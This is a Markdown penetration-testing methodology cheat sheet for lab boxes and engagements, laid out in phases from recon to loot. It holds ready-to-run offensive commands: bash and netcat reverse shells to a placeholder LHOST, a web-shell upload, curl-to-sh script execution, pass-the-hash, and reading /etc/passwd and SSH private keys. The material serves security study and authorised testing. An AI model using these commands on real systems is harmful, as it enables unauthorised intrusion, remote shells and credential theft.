# ðŸ”´ Penetration Testing Methodology

> Follow this for HackTheBox, TryHackMe, OSCP-style boxes, and real engagements.

---

## Phase 0: Scoping & Setup

- [ ] Define scope (IPs, domains, exclusions)
- [ ] Set engagement type (black/grey/white box)
- [ ] Create folder: `challenges/<box-name>/`
- [ ] Start VPN if needed
- [ ] Set target IP: `export TARGET=10.10.10.x`
- [ ] Start notes: open `notes.md`

---

## Phase 1: Reconnaissance

### Passive Recon (External Engagements)
```bash
whois $TARGET
nslookup $TARGET
dig $TARGET ANY
theHarvester -d domain.com -b all
shodan search hostname:domain.com
censys search domain.com
waybackurls domain.com
```

### Active Recon â€“ Port Scanning
```bash
# Full TCP scan
nmap -sC -sV -p- -oA scans/full-tcp $TARGET

# Fast initial scan
nmap -sV --open -p- --min-rate 5000 -oA scans/initial $TARGET

# UDP scan (top ports)
nmap -sU --top-ports 100 -oA scans/udp $TARGET

# Vuln scripts
nmap --script vuln -p <open ports> $TARGET
```

### Service-Specific Enumeration
```bash
# HTTP/HTTPS
nikto -h http://$TARGET
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://$TARGET/FUZZ -w wordlist.txt -mc 200,301,302,403

# SMB
enum4linux -a $TARGET
smbclient -L //$TARGET -N
smbmap -H $TARGET

# FTP
ftp $TARGET  # try anonymous login

# SSH
ssh -v user@$TARGET

# DNS
dig axfr @$TARGET domain.com   # zone transfer

# SNMP
snmpwalk -c public -v1 $TARGET
```

---

## Phase 2: Vulnerability Analysis

```
1. Map all open services â†’ identify versions
2. Search for known CVEs: searchsploit <service version>
3. Check default credentials
4. Manual testing of web apps (if present)
5. Check for misconfigurations
```

```bash
# Search exploits
searchsploit apache 2.4.49
searchsploit -m <exploit-id>   # copy to current dir

# CVE lookup
https://cve.mitre.org
https://exploit-db.com
https://github.com/advisories
```

---

## Phase 3: Exploitation

### Initial Access
```bash
# Web exploitation (common)
sqlmap -u "http://$TARGET/page?id=1" --dbs
curl -X POST http://$TARGET/upload -F "file=@shell.php"

# Metasploit
msfconsole
use exploit/...
set RHOSTS $TARGET
set LHOST tun0
run

# Manual reverse shell (always try manual first)
bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
python3 -c 'import socket,subprocess,os;...'
nc -e /bin/sh LHOST 4444

# Listener
nc -lvnp 4444
# or
rlwrap nc -lvnp 4444
```

### Shell Upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Phase 4: Post-Exploitation & Privilege Escalation

### Situational Awareness
```bash
id; whoami; hostname; uname -a
ip a; cat /etc/hosts
ps aux
env
history
```

### Linux PrivEsc
```bash
# Automated
curl -L https://linpeas.sh | sh
wget https://github.com/.../pspy64 && chmod +x pspy64 && ./pspy64

# Manual checks
sudo -l                                          # sudo rights
find / -perm -u=s -type f 2>/dev/null           # SUID
find / -writable -type f 2>/dev/null            # writable files
cat /etc/crontab && crontab -l                  # cron jobs
ss -tlnp                                        # listening ports (internal)
cat /etc/passwd                                 # users
ls -la /home/*/                                 # home dirs

# GTFOBins for SUID/sudo bypass: https://gtfobins.github.io
```

### Windows PrivEsc
```bash
whoami /all
net user; net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
winPEAS.exe
PowerUp.ps1
SharpHound.exe (BloodHound)
```

---

## Phase 5: Lateral Movement (if applicable)

```bash
# Credential reuse
crackmapexec smb subnet/24 -u user -p password

# Pass the hash
evil-winrm -i $TARGET -u admin -H <NTLM hash>

# SSH key reuse
find / -name id_rsa 2>/dev/null
cat /home/*/.ssh/id_rsa
```

---

## Phase 6: Proof & Loot

```bash
# Linux proof
cat /root/root.txt
cat /home/user/user.txt
screenshot: id && hostname && cat /root/root.txt

# Windows proof
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<user>\Desktop\user.txt
screenshot: whoami && hostname && type root.txt
```

Save all flags â†’ `loot/<box-name>.txt`

---

## Phase 7: Reporting

Use the [report template](../templates/report-template.md).

---

## ðŸ§° Essential Tools Reference

| Purpose | Tool |
|---|---|
| Port scan | nmap, rustscan |
| Web fuzzing | ffuf, gobuster, feroxbuster |
| Web vuln scan | nikto, nuclei |
| SQLi | sqlmap |
| Password crack | hashcat, john |
| Exploitation | metasploit, searchsploit |
| Privesc enum | linpeas, winpeas, pspy |
| Pwn | pwntools, gdb+pwndbg |
| Crypto | CyberChef, hashcat, dcode.fr |
| Reversing | Ghidra, Binary Ninja, radare2 |
| Forensics | volatility, autopsy, binwalk |
